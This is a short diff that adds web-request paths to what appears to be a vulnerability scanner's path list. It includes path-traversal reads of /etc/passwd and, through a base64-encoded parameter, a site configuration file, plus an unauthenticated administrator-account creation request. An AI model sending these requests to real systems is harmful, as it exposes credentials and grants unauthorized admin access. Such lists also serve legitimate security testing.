@@ -16,3 +16,8 @@
 /webui/?g=sys_dia_data_down&file_name=../etc/passwd
 /api/v1/GetSrc
 /api/v1/GetDevice
+/portal/attachment_clearTempFile.action?bean.RecId=1
+/portal/attachment_getAttList.action?bean.RecId=1
+/api/v1/user/save?ID=&Username={{user}}&Role=管理员&Enable=true
+/Content/Plugins/uploader/FileChoose.html
+/index.php?option=com_easyshop&task=ajax.loadImage&file=Li4vLi4vY29uZmlndXJhdGlvbi5waHA=
